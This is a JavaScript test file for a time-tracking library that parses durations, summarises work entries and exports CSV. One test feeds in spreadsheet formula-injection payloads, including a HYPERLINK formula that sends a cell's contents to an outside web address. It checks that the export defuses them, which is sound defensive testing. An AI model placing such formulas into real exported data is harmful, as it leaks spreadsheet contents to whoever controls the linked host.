// Run: node tests/time.test.js
const fs = require("fs"), path = require("path"), vm = require("vm"), assert = require("assert")
const src = fs.readFileSync(path.join(__dirname, "..", "Time.js"), "utf8").replace(/^\.pragma library/m, "")
const sandbox = { module: { exports: {} } }
vm.runInNewContext(src, sandbox)
const T = sandbox.module.exports
const plain = v => JSON.parse(JSON.stringify(v))

// durations
assert.strictEqual(T.parseDuration("1h 30m"), 5400)
assert.strictEqual(T.parseDuration("90m"), 5400)
assert.strictEqual(T.parseDuration("1.5h"), 5400)
assert.strictEqual(T.parseDuration("1,5 h"), 5400)
assert.strictEqual(T.parseDuration("1:30"), 5400)
assert.strictEqual(T.parseDuration("45"), 2700)
assert.strictEqual(T.parseDuration("2 hod"), 7200)
assert.strictEqual(T.parseDuration("abc"), null)
assert.strictEqual(T.parseDuration("1h banana"), null)
assert.strictEqual(T.parseDuration(""), null)
assert.strictEqual(T.formatDuration(5400), "1h 30m")
assert.strictEqual(T.formatDuration(3600), "1h")
assert.strictEqual(T.formatDuration(59), "59s")
assert.strictEqual(T.formatDuration(0), "0m")
assert.strictEqual(T.formatClock(754), "12:34")
assert.strictEqual(T.formatClock(3754), "1:02:34")
assert.strictEqual(T.hours(5400), "1.50")

// file parsing
assert.deepStrictEqual(plain(T.parse("").data), { version: 1, running: null, entries: [] })
assert.ok(T.parse("{oops").error)
assert.ok(T.parse('{"entries":[{"id":"x"}]}').error)
const file = T.parse(JSON.stringify({ entries: [{ id: "a", issueId: "i", identifier: "E-1", start: "2026-10-26T08:00:00Z", seconds: 600 }],
  running: { issueId: "j", startedAt: "2026-10-26T09:00:00Z" } }))
assert.strictEqual(file.data.entries[0].seconds, 600)
assert.strictEqual(file.data.running.issueId, "j")
assert.deepStrictEqual(plain(T.parse(T.serialize(file.data)).data), plain(file.data))

// timer -> entry
const e = T.entryFromRunning({ issueId: "i", identifier: "E-1", title: "T", projectName: "P", teamName: "Team", startedAt: "2026-10-26T08:00:00Z" },
  new Date("2026-10-26T09:30:00Z"), "id1", "pc")
assert.strictEqual(e.seconds, 5400)
assert.strictEqual(e.device, "pc")

// periods (local time)
const now = new Date(2026, 9, 28, 15, 0) // Wednesday 28 Oct 2026
const wk = T.period("week", 0, now)
assert.strictEqual(wk.from.getDate(), 26)
assert.strictEqual(wk.to.getDate(), 2)
assert.strictEqual(T.period("week", -1, now).from.getDate(), 19)
assert.strictEqual(T.period("month", -1, now).label, "Sep 2026")
assert.strictEqual(T.period("day", 0, now).label, "Today")
assert.strictEqual(T.period("day", -1, now).label, "Yesterday")

// summaries
const list = [
  { id: "1", issueId: "a", identifier: "E-1", title: "One", projectName: "P1", teamName: "T", start: new Date(2026, 9, 27, 9).toISOString(), seconds: 3600 },
  { id: "2", issueId: "b", identifier: "E-2", title: "Two", projectName: "P1", teamName: "T", start: new Date(2026, 9, 28, 9).toISOString(), seconds: 1800 },
  { id: "3", issueId: "a", identifier: "E-1", title: "One", projectName: "P1", teamName: "T", start: new Date(2026, 9, 28, 11).toISOString(), seconds: 600 },
  { id: "4", issueId: "c", identifier: "E-3", title: "Old", projectName: "", teamName: "T", start: new Date(2026, 8, 1, 9).toISOString(), seconds: 900 }
]
const thisWeek = T.entriesIn(list, wk)
assert.deepStrictEqual(plain(thisWeek.map(x => x.id)), ["3", "2", "1"])
assert.strictEqual(T.total(thisWeek), 6000)
assert.deepStrictEqual(plain(T.summarize(thisWeek, "issue").map(g => [g.key, g.seconds])), [["a", 4200], ["b", 1800]])
assert.deepStrictEqual(plain(T.summarize(list, "project").map(g => [g.label, g.seconds])), [["P1", 6000], ["No project", 900]])
assert.strictEqual(T.totalFor(list, "a"), 4200)
assert.deepStrictEqual(plain(T.totalsByIssue(list)), { a: 4200, b: 1800, c: 900 })

// CSV
const csv = T.toCsv([{ ...list[1], note: 'said "hi", ok' }, { ...list[0], manual: true }])
const lines = csv.trim().split("\n")
assert.strictEqual(lines[0], "Date,Start,End,Hours,Duration,Issue,Title,Project,Team,Note,Manual")
assert.strictEqual(lines[1], "2026-10-27,,,1.00,1h,E-1,One,P1,T,,yes")
assert.strictEqual(lines[2], '2026-10-28,09:00,09:30,0.50,30m,E-2,Two,P1,T,"said ""hi"", ok",')

// Issue titles, project names and notes come from Linear (anyone in the
// team writes them): a cell a spreadsheet would read as a formula starts
// with ' instead, and a lone \r is quoted like \n.
const formula = T.toCsv([{ ...list[0], manual: true, title: '=HYPERLINK("https://e.io/?"&A1,"x")', projectName: "@SUM(A1)",
  teamName: "+1", note: "-2+3", identifier: "\tE-1" }, { ...list[1], note: "a\rb", title: "=" }])
const f = formula.trim().split("\n")
assert.strictEqual(f[1], `2026-10-27,,,1.00,1h,'\tE-1,"'=HYPERLINK(""https://e.io/?""&A1,""x"")",'@SUM(A1),'+1,'-2+3,yes`)
assert.ok(formula.includes('"a\rb"'), JSON.stringify(formula))
assert.ok(formula.includes(",'=,"), JSON.stringify(formula))
// Ordinary text and numbers stay as they are.
assert.strictEqual(T.toCsv([{ ...list[1], note: "fixed it, -ish" }]).trim().split("\n")[1], '2026-10-28,09:00,09:30,0.50,30m,E-2,Two,P1,T,"fixed it, -ish",')

// merge
const m = T.merge({ entries: [list[0]], running: null }, { entries: [list[0], list[1]], running: null })
assert.strictEqual(m.added, 1)
assert.strictEqual(m.data.entries.length, 2)

// A sync conflict copy may go only when the file on disk already has all of it.
assert.strictEqual(T.covers({ entries: [list[0], list[1]], running: null }, { entries: [list[1]], running: null }), true)
assert.strictEqual(T.covers({ entries: [list[0]], running: null }, { entries: [list[0], list[1]], running: null }), false)
assert.strictEqual(T.covers({ entries: [], running: null }, { entries: [], running: null }), true)

// comment text and manual start
assert.ok(/^⏱ \*\*1h\*\* logged \(2026-10-27\)$/.test(T.commentBody({ ...list[0], manual: true })))
assert.strictEqual(T.manualStart("2026-10-26").getHours(), 12)
assert.strictEqual(T.manualStart("26.10.2026"), null)

console.log("ok")
